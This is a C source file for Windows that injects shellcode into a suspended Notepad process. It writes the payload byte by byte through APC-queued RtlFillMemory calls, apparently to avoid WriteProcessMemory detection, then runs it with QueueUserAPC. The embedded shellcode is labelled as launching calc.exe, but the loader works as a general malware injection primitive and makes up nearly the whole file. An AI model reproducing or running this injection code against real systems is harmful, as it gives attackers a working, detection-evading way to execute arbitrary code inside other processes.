#include <stdio.h>
#include <windows.h>

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength) {
    HANDLE hThread = NULL;
    DWORD(WINAPI * pNtQueueApcThread)
    (HANDLE ThreadHandle, PVOID pApcRoutine, PVOID pParam1, PVOID pParam2, PVOID pParam3) = NULL;
    DWORD(WINAPI * pNtCreateThreadEx)
    (HANDLE * phThreadHandle, DWORD DesiredAccess, PVOID ObjectAttributes, HANDLE hProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, DWORD * pZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) = NULL;
    void *pRtlFillMemory = NULL;

    // find NtQueueApcThread function
    pNtQueueApcThread = (unsigned long(__stdcall *)(void *, void *, void *, void *, void *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
    if (pNtQueueApcThread == NULL) {
        printf("failed to get NtQueueApcThread\n");
        return 1;
    }

    // find NtCreateThreadEx function
    pNtCreateThreadEx = (unsigned long(__stdcall *)(void **, unsigned long, void *, void *, void *, void *, unsigned long, unsigned long *, unsigned long, unsigned long, void *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL) {
        printf("failed to get NtCreateThreadEx\n");
        return 1;
    }

    // find RtlFillMemory function
    pRtlFillMemory = (void *)GetProcAddress(GetModuleHandle("kernel32.dll"), "RtlFillMemory");
    if (pRtlFillMemory == NULL) {
        printf("failed to get RtlFillMemory\n");
        return 1;
    }

    // create suspended thread (ExitThread)
    if (pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPVOID)ExitThread, (LPVOID)0, NT_CREATE_THREAD_EX_SUSPENDED, NULL, 0, 0, NULL) != 0) {
        printf("failed to create thread\n");
        return 1;
    }

    // write memory
    for (DWORD i = 0; i < dwLength; i++) {
        // schedule a call to RtlFillMemory to update the current byte
        if (pNtQueueApcThread(hThread, pRtlFillMemory, (void *)((BYTE *)pAddress + i), (void *)1, (void *)*(BYTE *)(pData + i)) != 0) {
            // error
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        }
    }

    // resume thread to execute queued APC calls
    ResumeThread(hThread);

    // wait for thread to exit
    WaitForSingleObject(hThread, INFINITE);

    // close thread handle
    CloseHandle(hThread);

    return 0;
}

void main(int argc, char *argv[]) {
    // 64bit calc.exe
    unsigned char buf[] = "\xFC\xEB\x76\x51\x52\x33\xC0\x65\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x70\x10\x48\xAD\x48\x89\x44\x24\x20\x48\x8B\x68\x30\x8B\x45\x3C\x83\xC0\x18\x8B\x7C\x28\x70\x48\x03\xFD\x8B\x4F\x18\x8B\x5F\x20\x48\x03\xDD\x67\xE3\x3A\xFF\xC9\x8B\x34\x8B\x48\x03\xF5\x33\xC0\x99\xAC\x84\xC0\x74\x07\xC1\xCA\x0D\x03\xD0\xEB\xF4\x3B\x54\x24\x18\x75\xE0\x8B\x5F\x24\x48\x03\xDD\x66\x8B\x0C\x4B\x8B\x5F\x1C\x48\x03\xDD\x8B\x04\x8B\x48\x03\xC5\x5A\x59\x5E\x5F\x56\xFF\xE0\x48\x8B\x74\x24\x20\xEB\x9B\x33\xC9\x48\x8D\x51\x01\x51\x68\x63\x61\x6C\x63\x48\x8B\xCC\x48\x83\xEC\x28\x68\x98\xFE\x8A\x0E\xE8\x6D\xFF\xFF\xFF\x33\xC9\x68\x7E\xD8\xE2\x73\xE8\x61\xFF\xFF\xFF";
    SIZE_T shellSize = sizeof(buf);

    STARTUPINFOA pStartupInfo = {0};
    PROCESS_INFORMATION pProcessInfo = {0};
    BOOL res = CreateProcessA(0, "C:\\Windows\\System32\\Notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &pStartupInfo, &pProcessInfo);
    if (res) {
        printf("create process success\n");
    } else {
        printf("create process failed\n");
        printf("reason: %d\n", GetLastError());
    }

    LPVOID shellAddress = VirtualAllocEx(pProcessInfo.hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellAddress == NULL) {
        printf("virtual alloc failed\n");
        printf("reason: %d\n", GetLastError());
    } else {
        printf("virtual alloc success\n");
    }

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    if (WriteProcessMemoryAPC(pProcessInfo.hProcess, (BYTE *)shellAddress, (BYTE *)buf, strlen(buf) + 1) != 0) {
        printf("failed to write memory\n");
    }


    QueueUserAPC((PAPCFUNC)apcRoutine, pProcessInfo.hThread, NULL);
    ResumeThread(pProcessInfo.hThread);
    return;
}